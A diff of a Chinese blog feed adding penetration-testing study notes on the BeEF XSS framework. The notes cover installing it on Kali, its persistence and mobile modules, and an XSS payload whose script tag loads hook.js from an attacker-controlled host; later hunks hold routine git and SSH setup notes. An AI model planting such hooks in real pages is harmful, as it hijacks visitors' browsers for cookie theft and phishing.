+<li><p>优点：功能多、强大，当利用xss上线后，还可以进行其他攻击，比如：url跳转、获取cookie、社会工程学攻击（flash钓鱼，通过提交一个的图片地址、以及文件下载地址（可以是木马，配合cs等））、内网信息收集（端口等）</p>
+<ul>
+<li><img src="/source/images/image-20210804213306095.png" alt="image-20210804213306095"></li>
+</ul>
+</li>
+<li><p>缺点：必须要对方不关闭当前浏览器才行，也就是只能在对方在存在payload的页面，我们才能在beef控制端进行攻击，一旦对方关闭页面，那么就无法攻击了</p>
+<ul>
+<li><p>绕过方法：使用BeEF API，用户上线后能够自动执行批量命令，结合Persistence模块能够极大提高shell存活时间</p>
+<p>除了与windows系统相关的信息无法获取，其他操作均能成功执行，并且BeEF为手机劫持提供了专门的模块系列——Phonegap</p>
+</li>
+</ul>
+</li>
+<li><p>beff利用方法以及安卓上线方法：<a href="https://blog.csdn.net/jsd2honey/article/details/78683938">BeEF 介绍_jsd2root的博客-CSDN博客_beef</a></p>
+<ul>
+<li>攻击手机需要学习怎么用php调用 PhoneGap API</li>
+</ul>
+</li>
+<li><p>kali命令行安装Beff或者自己下载安装：<a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
+</li>
+<li><p>kali下用法：</p>
+<ul>
+<li><p>apt-get install beef-xss</p>
+</li>
+<li><p>cd /usr/share/beef-xss</p>
+</li>
+<li><p>ls</p>
+</li>
+<li><p>修改默认密码：beff不允许使用默认密码：vim /etc/beef-xss/config.yaml     我这里使用的用户名是beef，密码是我自己常用的密码</p>
+</li>
+<li><p>./beef    </p>
+</li>
+<li><p>根据上一步运行得到的输出信息，有2个很重要</p>
+<ul>
+<li>其中Hook URL 是一个js地址，我们只要将该js地址复制，并且插入到xss里，如果对方中招，那么对方就会在beef上线，可以通过UI URL 控制端进行查看</li>
+<li>其中API key是用来自动执行模块的，因为beef是实时的，所以我们完全可以使用api来批量执行命令从而绕过其实时的缺陷: 40bf0f710021f9c73e96270c5e2cf233c15eb4f5</li>
+<li>其中 UI  URL 是控制端，直接网页里输入打开<ul>
+<li>账号和密码都是：beef</li>
+<li>进去后，左侧有两个功能<ul>
+<li>Online Browsers  :这个分类下显示的是在线的目标</li>
+<li>Offline Browsers ：这个分类下显示的是当时上线的目标，后面可能因为其他原因最后下线的目标</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>复制Hook URL ,构造xss</p>
+<ul>
+<li><pre><code class="javascript">&lt;script src=http://192.168.46.130:3000/hook.js&gt;&lt;/script&gt;  #其中，src的地址就是刚才复制的Hook URL地址，需要根据beff实际生成的地址进行替换#前提：如果想要上线，最好将beff部署在外网服务器才能上线，否则处在内网中，则无法上线,可以使用花生壳内网穿透来实现
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>#案例4-实例DOM型XSS演示-Pikachu_XSS</p>
+<ul>
+<li>我们可以把DOM理解为一个一个访问HTML的标准的编程接口。</li>
+<li>DOM是一个前端的接口，并没有和后端做任何的交互。</li>
+<li>所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。</li>
+</ul>
+<p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
+<p><a href="https://github.com/sqlsec/BlueLotus_XSSReceiver">https://github.com/sqlsec/BlueLotus_XSSReceiver</a></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -3097,7 +4891,7 @@ print(switch)<figure class="highlight plaintext"><table><tr><td class="code"><pr
 <p>推荐：推荐新式类，同时推荐每次定义类时，括号里都写上object，这样即使在python2中运行代码也不会出错</p>
 <h2 id="附录2-python错题"><a href="#附录2-python错题" class="headerlink" title="附录2 python错题"></a>附录2 python错题</h2><h3 id="1-git上传码云，提示无权限"><a href="#1-git上传码云，提示无权限" class="headerlink" title="1.git上传码云，提示无权限"></a>1.git上传码云，提示无权限</h3><p>第一步：在git终端上生成sshkey</p>
 <ul>
-<li><p>如果之前生成过，再输入该命令会提示是否覆盖，此时需要输入y才能覆盖，如果不输入，则不覆盖：ssh-keygen -t rsa -C “<a href="mailto:&#55;&#52;&#48;&#x33;&#49;&#x30;&#x33;&#x2b;&#x70;&#121;&#116;&#104;&#x6f;&#110;&#x5f;&#114;&#x6f;&#x61;&#x64;&#x40;&#x75;&#x73;&#101;&#114;&#x2e;&#x6e;&#111;&#114;&#101;&#112;&#x6c;&#x79;&#x2e;&#103;&#105;&#x74;&#x65;&#x65;&#x2e;&#x63;&#111;&#109;">&#55;&#52;&#48;&#x33;&#49;&#x30;&#x33;&#x2b;&#x70;&#121;&#116;&#104;&#x6f;&#110;&#x5f;&#114;&#x6f;&#x61;&#x64;&#x40;&#x75;&#x73;&#101;&#114;&#x2e;&#x6e;&#111;&#114;&#101;&#112;&#x6c;&#x79;&#x2e;&#103;&#105;&#x74;&#x65;&#x65;&#x2e;&#x63;&#111;&#109;</a>“</p>
+<li><p>如果之前生成过，再输入该命令会提示是否覆盖，此时需要输入y才能覆盖，如果不输入，则不覆盖：ssh-keygen -t rsa -C “<a href="mailto:&#55;&#x34;&#48;&#x33;&#49;&#48;&#51;&#x2b;&#x70;&#121;&#116;&#104;&#x6f;&#x6e;&#95;&#114;&#111;&#97;&#x64;&#x40;&#x75;&#115;&#101;&#114;&#46;&#110;&#111;&#114;&#x65;&#x70;&#x6c;&#x79;&#46;&#103;&#x69;&#x74;&#x65;&#101;&#x2e;&#99;&#x6f;&#x6d;">&#55;&#x34;&#48;&#x33;&#49;&#48;&#51;&#x2b;&#x70;&#121;&#116;&#104;&#x6f;&#x6e;&#95;&#114;&#111;&#97;&#x64;&#x40;&#x75;&#115;&#101;&#114;&#46;&#110;&#111;&#114;&#x65;&#x70;&#x6c;&#x79;&#46;&#103;&#x69;&#x74;&#x65;&#101;&#x2e;&#99;&#x6f;&#x6d;</a>“</p>
 <p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403191502617.png" alt="image-20200403191502617"></p>
 </li>
 <li><p>查看生成的ssh秘钥：cat ~/.ssh/id_rsa.pub</p>
@@ -3106,7 +4900,7 @@ print(switch)<figure class="highlight plaintext"><table><tr><td class="code"><pr
 </ul>
 <p>第二步：在码云个人设置里—ssh公钥—新增公钥—-名称建议输入和项目名，公钥输入刚才复制的</p>
 <p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403191817999.png" alt="image-20200403191817999"></p>
-<p>第三步：回到git终端输入： ssh -T <a href="mailto:&#x67;&#105;&#116;&#x40;&#x67;&#105;&#x74;&#101;&#101;&#46;&#x63;&#x6f;&#x6d;">&#x67;&#105;&#116;&#x40;&#x67;&#105;&#x74;&#101;&#101;&#46;&#x63;&#x6f;&#x6d;</a>  显示下图界面就代表成功了</p>
+<p>第三步：回到git终端输入： ssh -T <a href="mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#101;&#x65;&#46;&#x63;&#111;&#109;">&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#101;&#x65;&#46;&#x63;&#111;&#109;</a>  显示下图界面就代表成功了</p>
 <ul>
 <li><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200403191921263.png" alt="image-20200403191921263"></li>
 </ul>
@@ -3785,8 +5579,8 @@ print(switch)<figure class="highlight plaintext"><table><tr><td class="code"><pr
 <ul>
 <li>git init </li>
 <li>git config –global user.name “发飙的登山包”</li>
-<li>git config –global user.email “<a href="mailto:&#55;&#x34;&#x30;&#51;&#x31;&#48;&#x33;&#x2b;&#112;&#x79;&#116;&#104;&#111;&#110;&#x5f;&#114;&#111;&#97;&#100;&#64;&#x75;&#115;&#x65;&#114;&#x2e;&#x6e;&#111;&#x72;&#x65;&#x70;&#108;&#x79;&#x2e;&#x67;&#105;&#x74;&#101;&#x65;&#x2e;&#99;&#x6f;&#109;">&#55;&#x34;&#x30;&#51;&#x31;&#48;&#x33;&#x2b;&#112;&#x79;&#116;&#104;&#111;&#110;&#x5f;&#114;&#111;&#97;&#100;&#64;&#x75;&#115;&#x65;&#114;&#x2e;&#x6e;&#111;&#x72;&#x65;&#x70;&#108;&#x79;&#x2e;&#x67;&#105;&#x74;&#101;&#x65;&#x2e;&#99;&#x6f;&#109;</a>“</li>
-<li>git remote add origin <a href="mailto:&#x67;&#105;&#x74;&#64;&#103;&#x69;&#116;&#101;&#x65;&#x2e;&#99;&#111;&#109;">&#x67;&#105;&#x74;&#64;&#103;&#x69;&#116;&#101;&#x65;&#x2e;&#99;&#111;&#109;</a>:python_road/old_boy_python_self_study.git</li>
+<li>git config –global user.email “<a href="mailto:&#55;&#x34;&#48;&#x33;&#49;&#x30;&#x33;&#x2b;&#x70;&#121;&#116;&#x68;&#x6f;&#x6e;&#95;&#x72;&#x6f;&#97;&#100;&#x40;&#117;&#115;&#x65;&#114;&#x2e;&#x6e;&#x6f;&#114;&#x65;&#112;&#108;&#x79;&#x2e;&#103;&#x69;&#x74;&#x65;&#x65;&#x2e;&#99;&#x6f;&#109;">&#55;&#x34;&#48;&#x33;&#49;&#x30;&#x33;&#x2b;&#x70;&#121;&#116;&#x68;&#x6f;&#x6e;&#95;&#x72;&#x6f;&#97;&#100;&#x40;&#117;&#115;&#x65;&#114;&#x2e;&#x6e;&#x6f;&#114;&#x65;&#112;&#108;&#x79;&#x2e;&#103;&#x69;&#x74;&#x65;&#x65;&#x2e;&#99;&#x6f;&#109;</a>“</li>
+<li>git remote add origin <a href="mailto:&#x67;&#x69;&#116;&#x40;&#103;&#x69;&#x74;&#x65;&#x65;&#46;&#99;&#111;&#109;">&#x67;&#x69;&#116;&#x40;&#103;&#x69;&#x74;&#x65;&#x65;&#46;&#99;&#111;&#109;</a>:python_road/old_boy_python_self_study.git</li>
 </ul>
 <p>以上就初始化完成</p>
 </li>
